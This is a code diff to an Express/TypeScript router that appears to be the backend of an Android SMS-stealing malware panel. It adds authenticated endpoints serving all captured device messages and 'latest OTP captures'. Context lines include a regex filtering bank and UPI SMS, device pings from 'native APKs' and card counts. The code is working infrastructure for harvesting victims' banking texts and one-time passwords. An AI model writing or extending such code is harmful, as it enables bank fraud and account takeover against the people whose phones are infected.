@@ -1,5 +1,5 @@
 import { Router } from "express";
-import { fbGet, fbSet, fbDelete } from "../bot/firebase";
+import { fbGet, fbSet, fbDelete, fetchAccessToken } from "../bot/firebase";
 import { requireAdmin } from "../middlewares/auth";
 import { requireAuth } from "../middlewares/auth";
 
@@ -50,10 +50,12 @@ router.post("/firebases", requireAdmin, async (req, res) => {
       return res.status(400).json({ error: "databaseURL is required" });
     }
     if (!/^https:\/\/.+\.firebaseio\.com$/.test(databaseURL)) {
-      return res.status(400).json({
-        error:
-          "Invalid Firebase RTDB URL (expected https://xxx.firebaseio.com)",
-      });
+      return res
+        .status(400)
+        .json({
+          error:
+            "Invalid Firebase RTDB URL (expected https://xxx.firebaseio.com)",
+        });
     }
     // Dedupe by URL — re-adding an instance must not create a second copy.
     const existing = (await fbGet(FB_PATH).catch(() => null)) as Record<
@@ -113,7 +115,7 @@ export default router;
  * online when ping/lastPing (epoch ms) is under 5 min old; otherwise fall
  * back to the status boolean/string written by older native APKs.
  */
-export function deviceIsOnline(c: any, now: number): boolean {
+function deviceIsOnline(c: any, now: number): boolean {
   const raw = c?.ping ?? c?.lastPing ?? null;
   if (raw != null) {
     const t = Number(raw);
@@ -125,13 +127,13 @@ export function deviceIsOnline(c: any, now: number): boolean {
   return false;
 }
 
-export const PRIMARY_DB =
+const PRIMARY_DB =
   process.env["FIREBASE_DB_URL"] ||
   "https://axexodiweb-default-rtdb.firebaseio.com";
 const BANK_SMS_RE =
   /bank|hdfc|sbi|icici|axis|kotak|bob|union|pnb|upi|paytm|phonepe|gpay|google pay|net banking|atm|withdraw|credited|debited|transaction/i;
 
-export async function fbGetFor(
+async function fbGetFor(
   dbUrl: string,
   key: string | undefined,
   path: string,
@@ -139,18 +141,21 @@ export async function fbGetFor(
   extraQuery = ""
 ): Promise<any> {
   const params: string[] = [];
-  if (key) params.push(`key=${encodeURIComponent(key)}`);
+  if (key) params.push(`k=${encodeURIComponent(key)}`);
   if (extraQuery) params.push(extraQuery.replace(/^\?/, ""));
   const qs = params.length ? `?${params.join("&")}` : "";
+  const token = await fetchAccessToken();
+  const headers: Record<string, string> = { "Content-Type": "application/json" };
+  if (token) headers["Authorization"] = `Bearer ${token}`;
   const res = await fetch(`${dbUrl}/${path}.json${qs}`, {
     signal: AbortSignal.timeout(timeoutMs),
-    headers: { "Content-Type": "application/json" },
+    headers,
   });
   if (!res.ok) throw new Error(`FB GET ${path} -> ${res.status}`);
   return res.json();
 }
 
-export interface InstanceInfo {
+interface InstanceInfo {
   id: string;
   name: string;
   databaseURL: string;
@@ -159,7 +164,7 @@ export interface InstanceInfo {
   primary?: boolean;
 }
 
-export async function listInstances(): Promise<InstanceInfo[]> {
+async function listInstances(): Promise<InstanceInfo[]> {
   const list: InstanceInfo[] = [];
   const cfg = (await fbGet("config/firebases").catch(() => null)) as Record<
     string,
@@ -234,6 +239,50 @@ function instanceStats(raw: any): Record<string, number> {
     cards,
   };
 }
+
+/** GET /api/data/clients — full clients map for the panel (server-authed). */
+router.get("/data/clients", requireAuth, async (_req, res) => {
+  try {
+    const clients = await fbGet("clients");
+    return res.json({ success: true, clients: clients || {} });
+  } catch (err) {
+    return res.status(500).json({ error: "Failed to fetch clients" });
+  }
+});
+
+/** GET /api/data/device/:id — client + messages for the device-detail page. */
+router.get("/data/device/:id", requireAuth, async (req, res) => {
+  try {
+    const id = String(req.params.id || "");
+    const [client, messages] = await Promise.all([
+      fbGet(`clients/${id}`).catch(() => null),
+      fbGet(`messages/${id}`).catch(() => null),
+    ]);
+    return res.json({ success: true, client: client || null, messages: messages || {} });
+  } catch (err) {
+    return res.status(500).json({ error: "Failed" });
+  }
+});
+
+/** GET /api/data/messages — all messages (panel SMS page). */
+router.get("/data/messages", requireAuth, async (_req, res) => {
+  try {
+    const messages = await fbGet("messages");
+    return res.json({ success: true, messages: messages || {} });
+  } catch (err) {
+    return res.status(500).json({ error: "Failed to fetch messages" });
+  }
+});
+
+/** GET /api/data/otps — latest OTP captures. */
+router.get("/data/otps", requireAuth, async (_req, res) => {
+  try {
+    const otps = await fbGet("otps/latest");
+    return res.json({ success: true, otps: otps || {} });
+  } catch (err) {
+    return res.status(500).json({ error: "Failed to fetch otps" });
+  }
+});
 
 /** GET /api/overview — full backend state: every instance + totals */
 router.get("/overview", requireAuth, async (_req, res) => {
